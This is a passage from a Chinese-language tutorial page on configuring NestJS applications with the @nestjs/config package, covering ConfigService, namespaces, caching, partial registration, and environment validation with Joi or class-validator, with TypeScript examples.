class=\"string\">&#x27;path&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"variable constant_\">YAML_CONFIG_FILENAME</span> = <span class=\"string\">&#x27;config.yml&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> () =&gt; &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> yaml.<span class=\"title function_\">load</span>(</span><br><span class=\"line\">    fs.<span class=\"title function_\">readFileSync</span>(<span class=\"title function_\">join</span>(__dirname, <span class=\"variable constant_\">YAML_CONFIG_FILENAME</span>), <span class=\"string\">&#x27;utf8&#x27;</span>),</span><br><span class=\"line\">  );</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"使用ConfigService\"><a href=\"#使用ConfigService\" class=\"headerlink\" title=\"使用ConfigService\"></a>使用<code>ConfigService</code></h2><p>要从<code>ConfigService</code>中访问配置值，我们首先得注入<code>ConfigService</code>，和使用其他<code>provider</code>一样，我们需要将其加入@Module的<code>imports</code>属性中（如果将<code>ConfigModule</code>配置成全局module，则可以忽略这一步）</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Module</span>(&#123;</span><br><span class=\"line\">  <span class=\"attr\">imports</span>: [<span class=\"title class_\">ConfigModule</span>],</span><br><span class=\"line\">  <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n\n<p>然后我们可以使用标准的构造函数注入:</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// import &#123; ConfigService &#125; from &#x27;@nestjs/config&#x27;;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">constructor</span>(<span class=\"params\"><span class=\"keyword\">private</span> configService: ConfigService</span>) &#123;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>获取</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// get an environment variable</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> dbUser = <span class=\"variable language_\">this</span>.<span class=\"property\">configService</span>.<span class=\"property\">get</span>&lt;<span class=\"built_in\">string</span>&gt;(<span class=\"string\">&#x27;DATABASE_USER&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// get a custom configuration value</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> dbHost = <span class=\"variable language_\">this</span>.<span class=\"property\">configService</span>.<span class=\"property\">get</span>&lt;<span class=\"built_in\">string</span>&gt;(<span class=\"string\">&#x27;database.host&#x27;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>如上所示，使用<code>configService.get()</code>方法通过传递变量名来获取一个简单的环境变量。你可以通过传递类型来做TypeScript类型提示，如上所示(例如，<code>get&lt;string&gt;(…)</code>)。<code>get()</code>方法也可以遍历一个嵌套的自定义配置对象（通过自定义配置文件创建），如上面第二个例子所示。</p>\n<p>你也可以使用一个接口作为类型提示来获得整个嵌套的自定义配置对象。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">DatabaseConfig</span> &#123;</span><br><span class=\"line\">  <span class=\"attr\">host</span>: <span class=\"built_in\">string</span>;</span><br><span class=\"line\">  <span class=\"attr\">port</span>: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> dbConfig = <span class=\"variable language_\">this</span>.<span class=\"property\">configService</span>.<span class=\"property\">get</span>&lt;<span class=\"title class_\">DatabaseConfig</span>&gt;(<span class=\"string\">&#x27;database&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// you can now use `dbConfig.port` and `dbConfig.host`</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> port = dbConfig.<span class=\"property\">port</span>;</span><br></pre></td></tr></table></figure>\n\n<p><code>get()</code>方法还需要一个可选的第二个参数，定义一个默认值，当键不存在时，将返回默认值，如下所示:</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// use &quot;localhost&quot; when &quot;database.host&quot; is not defined</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> dbHost = <span class=\"variable language_\">this</span>.<span class=\"property\">configService</span>.<span class=\"property\">get</span>&lt;<span class=\"built_in\">string</span>&gt;(<span class=\"string\">&#x27;database.host&#x27;</span>, <span class=\"string\">&#x27;localhost&#x27;</span>);</span><br></pre></td></tr></table></figure>\n\n<p><code>ConfigService</code>有一个可选的泛型(类型参数)来帮助防止访问不存在的配置属性。使用方法如下:</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">EnvironmentVariables</span> &#123;</span><br><span class=\"line\">  <span class=\"attr\">PORT</span>: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">  <span class=\"attr\">TIMEOUT</span>: <span class=\"built_in\">string</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// somewhere in the code</span></span><br><span class=\"line\"><span class=\"title function_\">constructor</span>(<span class=\"params\"><span class=\"keyword\">private</span> configService: ConfigService&lt;EnvironmentVariables&gt;</span>) &#123;</span><br><span class=\"line\">  <span class=\"comment\">// this is valid</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> port = <span class=\"variable language_\">this</span>.<span class=\"property\">configService</span>.<span class=\"property\">get</span>&lt;<span class=\"built_in\">number</span>&gt;(<span class=\"string\">&#x27;PORT&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// this is invalid as URL is not a property on the EnvironmentVariables interface</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> url = <span class=\"variable language_\">this</span>.<span class=\"property\">configService</span>.<span class=\"property\">get</span>&lt;<span class=\"built_in\">string</span>&gt;(<span class=\"string\">&#x27;URL&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"配置命名空间\"><a href=\"#配置命名空间\" class=\"headerlink\" title=\"配置命名空间\"></a>配置命名空间</h2><p><code>ConfigModule</code>允许您定义和加载多个自定义配置文件，如上面的自定义配置文件所示。您可以使用嵌套的配置对象管理复杂的配置对象层次，如该节所示。另外，您也可以使用 registerAs()函数返回一个 “namespaced “的配置对象，如下所示。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123; registerAs &#125; <span class=\"keyword\">from</span> <span class=\"string\">&#x27;@nestjs/config&#x27;</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> <span class=\"title function_\">registerAs</span>(<span class=\"string\">&#x27;database&#x27;</span>, <span class=\"function\">() =&gt;</span> (&#123;</span><br><span class=\"line\">  <span class=\"attr\">host</span>: process.<span class=\"property\">env</span>.<span class=\"property\">DATABASE_HOST</span>,</span><br><span class=\"line\">  <span class=\"attr\">port</span>: process.<span class=\"property\">env</span>.<span class=\"property\">DATABASE_PORT</span> || <span class=\"number\">5432</span></span><br><span class=\"line\">&#125;));</span><br></pre></td></tr></table></figure>\n\n<p>用<code>forRoot()</code>方法的参数对象的<code>load</code>属性加载一个命名空间的配置，与加载自定义配置文件的方式相同。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> databaseConfig <span class=\"keyword\">from</span> <span class=\"string\">&#x27;./config/database.config&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Module</span>(&#123;</span><br><span class=\"line\">  <span class=\"attr\">imports</span>: [</span><br><span class=\"line\">    <span class=\"title class_\">ConfigModule</span>.<span class=\"title function_\">forRoot</span>(&#123;</span><br><span class=\"line\">      <span class=\"attr\">load</span>: [databaseConfig],</span><br><span class=\"line\">    &#125;),</span><br><span class=\"line\">  ],</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> <span class=\"title class_\">AppModule</span> &#123;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>现在，要从<code>database</code>命名空间中获取<code>host</code>，使用点操作符。使用<code>database</code>作为属性名的前缀，对应于命名空间的名称（作为 <code>registerAs()</code> 函数的第一个参数传递）。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> dbHost = <span class=\"variable language_\">this</span>.<span class=\"property\">configService</span>.<span class=\"property\">get</span>&lt;<span class=\"built_in\">string</span>&gt;(<span class=\"string\">&#x27;database.host&#x27;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>一个合理的选择是直接注入<code>database</code>命名空间。这使我们能够从强类型化中获益。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// import &#123; ConfigType &#125; from &#x27;@nestjs/config&#x27;;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">constructor</span>(<span class=\"params\"></span></span><br><span class=\"line\"><span class=\"params\">  <span class=\"meta\">@Inject</span>(databaseConfig.KEY)</span></span><br><span class=\"line\"><span class=\"params\">  <span class=\"keyword\">private</span> dbConfig: ConfigType&lt;<span class=\"keyword\">typeof</span> databaseConfig&gt;,</span></span><br><span class=\"line\"><span class=\"params\"></span>) &#123;&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"缓存环境变量\"><a href=\"#缓存环境变量\" class=\"headerlink\" title=\"缓存环境变量\"></a>缓存环境变量</h2><p>由于访问<code>process.env</code>会很慢，你可以设置传递给<code>ConfigModule.forRoot()</code>的<code>options</code>对象的<code>cache</code>属性，以提高<code>ConfigService</code>的性能。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title class_\">ConfigModule</span>.<span class=\"title function_\">forRoot</span>(&#123;</span><br><span class=\"line\">  <span class=\"attr\">cache</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"部分注册\"><a href=\"#部分注册\" class=\"headerlink\" title=\"部分注册\"></a>部分注册</h2><p>到目前为止，我们已经用<code>forRoot()</code>方法处理了根模块(如<code>AppModule</code>)中的配置文件。也许你有一个更复杂的项目结构，特定功能的配置文件位于多个不同的目录中。<code>@nestjs/config</code>包提供了一个叫做部分注册的功能，它只引用与每个功能模块相关联的配置文件，而不是在根模块中加载所有这些文件。在特性模块中使用<code>forFeature()</code>静态方法来执行这个部分注册，如下所示。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> databaseConfig <span class=\"keyword\">from</span> <span class=\"string\">&#x27;./config/database.config&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Module</span>(&#123;</span><br><span class=\"line\">  <span class=\"attr\">imports</span>: [<span class=\"title class_\">ConfigModule</span>.<span class=\"title function_\">forFeature</span>(databaseConfig)],</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> <span class=\"title class_\">DatabaseModule</span> &#123;&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"校验环境变量\"><a href=\"#校验环境变量\" class=\"headerlink\" title=\"校验环境变量\"></a>校验环境变量</h2><p>如果所需的环境变量没有被提供或不符合某些验证规则，在应用程序启动时抛出异常是标准做法。<code>@nestjsconfig</code>包有两种不同的方式来实现这一点。</p>\n<ul>\n<li><a href=\"https://github.com/sideway/joi\">Joi</a>内置验证器。使用Joi，你可以定义一个对象模式，并对其进行JavaScript对象验证。</li>\n<li>一个自定义的<code>validate()</code>函数，它接受环境变量作为输入。</li>\n</ul>\n<p>要使用Joi，我们必须安装Joi包:</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">$ </span><span class=\"language-bash\">yarn add joi</span></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>最新版本的joi需要你运行Node v12或更高版本。旧版本的node请安装v16.1.8。这主要是在v17.0.2发布后，在构建的时候会出现错误。更多信息请参考其17.0.0发布说明(<a href=\"https://github.com/sideway/joi/issues/2262)%E3%80%82\">https://github.com/sideway/joi/issues/2262)。</a></p>\n</blockquote>\n<p>现在我们可以定义一个Joi验证模式，并通过<code>forRoot()</code>方法的选项对象的<code>validationSchema</code>属性传递，如下图所示。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> * <span class=\"keyword\">as</span> <span class=\"title class_\">Joi</span> <span class=\"keyword\">from</span> <span class=\"string\">&#x27;joi&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Module</span>(&#123;</span><br><span class=\"line\">  <span class=\"attr\">imports</span>: [</span><br><span class=\"line\">    <span class=\"title class_\">ConfigModule</span>.<span class=\"title function_\">forRoot</span>(&#123;</span><br><span class=\"line\">      <span class=\"attr\">validationSchema</span>: <span class=\"title class_\">Joi</span>.<span class=\"title function_\">object</span>(&#123;</span><br><span class=\"line\">        <span class=\"attr\">NODE_ENV</span>: <span class=\"title class_\">Joi</span>.<span class=\"title function_\">string</span>()</span><br><span class=\"line\">          .<span class=\"title function_\">valid</span>(<span class=\"string\">&#x27;development&#x27;</span>, <span class=\"string\">&#x27;production&#x27;</span>, <span class=\"string\">&#x27;test&#x27;</span>, <span class=\"string\">&#x27;provision&#x27;</span>)</span><br><span class=\"line\">          .<span class=\"title function_\">default</span>(<span class=\"string\">&#x27;development&#x27;</span>),</span><br><span class=\"line\">        <span class=\"attr\">PORT</span>: <span class=\"title class_\">Joi</span>.<span class=\"title function_\">number</span>().<span class=\"title function_\">default</span>(<span class=\"number\">3000</span>),</span><br><span class=\"line\">      &#125;),</span><br><span class=\"line\">    &#125;),</span><br><span class=\"line\">  ],</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> <span class=\"title class_\">AppModule</span> &#123;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>默认情况下，所有的 schema keys 都被认为是可选的。这里，我们为 <code>NODE_ENV</code>和<code>PORT</code>设置了默认值，如果我们不在环境(.env文件或进程环境)中提供这些变量，就会使用这些变量。另外，我们也可以使用 <code>required()</code> 验证方法来要求必须在环境 (.env 文件或进程环境) 中定义一个值。在这种情况下，如果我们没有在环境中提供变量，验证步骤将抛出一个异常。关于如何构造验证模式，请参见Joi验证方法。</p>\n<p>默认情况下，允许未知的环境变量（模式中键不存在的环境变量），并且不会触发验证异常。默认情况下，所有的验证错误都会被报告。你可以通过<code>forRoot()</code>选项对象的<code>validationOptions</code>键传递一个选项对象来改变这些行为。这个选项对象可以包含Joi验证选项提供的任何标准验证选项属性。例如，要反转上面的两个设置，可以传递这样的选项。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> * <span class=\"keyword\">as</span> <span class=\"title class_\">Joi</span> <span class=\"keyword\">from</span> <span class=\"string\">&#x27;joi&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Module</span>(&#123;</span><br><span class=\"line\">  <span class=\"attr\">imports</span>: [</span><br><span class=\"line\">    <span class=\"title class_\">ConfigModule</span>.<span class=\"title function_\">forRoot</span>(&#123;</span><br><span class=\"line\">      <span class=\"attr\">validationSchema</span>: <span class=\"title class_\">Joi</span>.<span class=\"title function_\">object</span>(&#123;</span><br><span class=\"line\">        <span class=\"attr\">NODE_ENV</span>: <span class=\"title class_\">Joi</span>.<span class=\"title function_\">string</span>()</span><br><span class=\"line\">          .<span class=\"title function_\">valid</span>(<span class=\"string\">&#x27;development&#x27;</span>, <span class=\"string\">&#x27;production&#x27;</span>, <span class=\"string\">&#x27;test&#x27;</span>, <span class=\"string\">&#x27;provision&#x27;</span>)</span><br><span class=\"line\">          .<span class=\"title function_\">default</span>(<span class=\"string\">&#x27;development&#x27;</span>),</span><br><span class=\"line\">        <span class=\"attr\">PORT</span>: <span class=\"title class_\">Joi</span>.<span class=\"title function_\">number</span>().<span class=\"title function_\">default</span>(<span class=\"number\">3000</span>),</span><br><span class=\"line\">      &#125;),</span><br><span class=\"line\">      <span class=\"attr\">validationOptions</span>: &#123;</span><br><span class=\"line\">        <span class=\"attr\">allowUnknown</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\">        <span class=\"attr\">abortEarly</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">    &#125;),</span><br><span class=\"line\">  ],</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> <span class=\"title class_\">AppModule</span> &#123;&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>@nestjsconfig</code>包使用的默认设置是:</p>\n<ul>\n<li><code>allowUnknown</code>：控制是否允许在环境变量中使用未知键。默认为<code>true</code>。</li>\n<li><code>abortEarly</code>： 如果为true，则在第一个错误时停止验证；如果为false，则返回所有错误。默认值为<code>false</code>。</li>\n</ul>\n<p>请注意，一旦你决定传递一个<code>validationOptions</code>对象，你没有明确传递的任何设置都将默认为Joi标准默认值（而不是<code>@nestjsconfig</code>默认值）。例如，如果你在你的自定义<code>validationOptions</code>对象中没有指定<code>allowUnknowns</code>，它将有Joi默认值<code>false</code>。因此，在您的自定义对象中指定这两个设置可能是最安全的。</p>\n<h2 id=\"自定义校验函数\"><a href=\"#自定义校验函数\" class=\"headerlink\" title=\"自定义校验函数\"></a>自定义校验函数</h2><p>另外，你也可以指定一个同步的<code>validate</code>函数，该函数接收一个包含环境变量的对象（来自env文件和进程），并返回一个包含验证过的环境变量的对象，这样你就可以在需要的时候转换它们。如果函数抛出一个错误，它将阻止应用程序的引导。</p>\n<p>在这个例子中，我们将继续使用<code>class-transformer</code>和<code>class-validator</code>包。首先，我们必须定义。</p>\n<ul>\n<li>一个具有验证约束的类，</li>\n<li>一个使用 <code>plainToClass</code> 和 <code>validateSync</code> 函数的验证函数。</li>\n</ul>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123; plainToClass &#125; <span class=\"keyword\">from</span> <span class=\"string\">&#x27;class-transformer&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; <span class=\"title class_\">IsEnum</span>, <span class=\"title class_\">IsNumber</span>, validateSync &#125; <span class=\"keyword\">from</span> <span class=\"string\">&#x27;class-validator&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">enum</span> <span class=\"title class_\">Environment</span> &#123;</span><br><span class=\"line\">  <span class=\"title class_\">Development</span> = <span class=\"string\">&quot;development&quot;</span>,</span><br><span class=\"line\">  <span class=\"title class_\">Production</span> = <span class=\"string\">&quot;production&quot;</span>,</span><br><span class=\"line\">  <span class=\"title class_\">Test</span> = <span class=\"string\">&quot;test&quot;</span>,</span><br><span class=\"line\">  <span class=\"title class_\">Provision</span> = <span class=\"string\">&quot;provision&quot;</span>,</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">EnvironmentVariables</span> &#123;</span><br><span class=\"line\">  <span class=\"meta\">@IsEnum</span>(<span class=\"title class_\">Environment</span>)</span><br><span class=\"line\">  <span class=\"attr\">NODE_ENV</span>: <span class=\"title class_\">Environment</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"meta\">@IsNumber</span>()</span><br><span class=\"line\">  <span class=\"attr\">PORT</span>: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">function</span> <span class=\"title function_\">validate</span>(<span class=\"params\">config: Record&lt;<span class=\"built_in\">string</span>, unknown&gt;</span>) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> validatedConfig = <span class=\"title function_\">plainToClass</span>(</span><br><span class=\"line\">    <span class=\"title class_\">EnvironmentVariables</span>,</span><br><span class=\"line\">    config,</span><br><span class=\"line\">    &#123; <span class=\"attr\">enableImplicitConversion</span>: <span class=\"literal\">true</span> &#125;,</span><br><span class=\"line\">  );</span><br><span class=\"line\">  <span class=\"keyword\">const</span> errors = <span class=\"title function_\">validateSync</span>(validatedConfig, &#123; <span class=\"attr\">skipMissingProperties</span>: <span class=\"literal\">false</span> &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (errors.<span class=\"property\">length</span> &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Error</span>(errors.<span class=\"title function_\">toString</span>());</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> validatedConfig;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>完成这些之后，使用<code>validate</code>函数作为<code>ConfigModule</code>的配置选项，如下所示:</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123; validate &#125; <span class=\"keyword\">from</span> <span class=\"string\">&#x27;./env.validation&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Module</span>(&#123;</span><br><span class=\"line\">  <span class=\"attr\">imports</span>: [</span><br><span class=\"line\">    <span class=\"title class_\">ConfigModule</span>.<span class=\"title function_\">forRoot</span>(&#123;</span><br><span class=\"line\">      validate,</span><br><span class=\"line\">    &#125;),</span><br><span class=\"line\">  ],</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> <span class=\"title class_\">AppModule</span> &#123;&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"自定义getter函数\"><a href=\"#自定义getter函数\" class=\"headerlink\" title=\"自定义getter函数\"></a>自定义getter函数</h2><p><code>ConfigService</code>定义了一个通用的<code>get()</code>方法，通过键来检索配置值。我们还可以添加getter函数，以实现更自然的编码风格。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Injectable</span>()</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ApiConfigService</span> &#123;</span><br><span class=\"line\">  <span class=\"title function_\">constructor</span>(<span class=\"params\"><span class=\"keyword\">private</span> configService: ConfigService</span>) &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">get</span> <span class=\"title function_\">isAuthEnabled</span>(): <span class=\"built_in\">boolean</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"variable language_\">this</span>.<span class=\"property\">configService</span>.<span class=\"title function_\">get</span>(<span class=\"string\">&#x27;AUTH_ENABLED&#x27;</span>) === <span class=\"string\">&#x27;true&#x27;</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>现在我们可以使用getter函数如下:</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Injectable</span>()</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> <span class=\"title class_\">AppService</span> &#123;</span><br><span class=\"line\">  <span class=\"title function_\">constructor</span>(<span class=\"params\">apiConfigService: ApiConfigService</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (apiConfigService.<span class=\"property\">isAuthEnabled</span>) &#123;</span><br><span class=\"line\">      <span class=\"comment\">// Authentication is enabled</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"可扩展变量\"><a href=\"#可扩展变量\" class=\"headerlink\" 